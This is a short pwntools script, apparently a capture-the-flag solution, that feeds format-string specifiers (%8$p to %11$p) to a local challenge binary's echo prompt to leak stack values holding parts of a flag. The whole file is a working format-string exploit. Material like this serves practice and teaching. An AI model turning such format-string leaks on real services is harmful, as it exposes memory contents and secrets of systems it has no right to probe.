from pwn import *

context.os = 'linux'
elf = ELF('./chall')
io = process("./chall")

def stk_leaker(offset):
    io.sendlineafter(b'Enter whatever you like and i will echo it back to you.\n', offset)
    io.recvuntil(b'Say something: ')
    a = io.recvline()
    log.info(f'flag part: {a}')
    return a 
a = stk_leaker("%8$p")
b = stk_leaker("%9$p")
c = stk_leaker("%10$p")
d = stk_leaker("%11$p")
log.info(f'flag parts: {a} {b} {c} {d}')
io.interactive()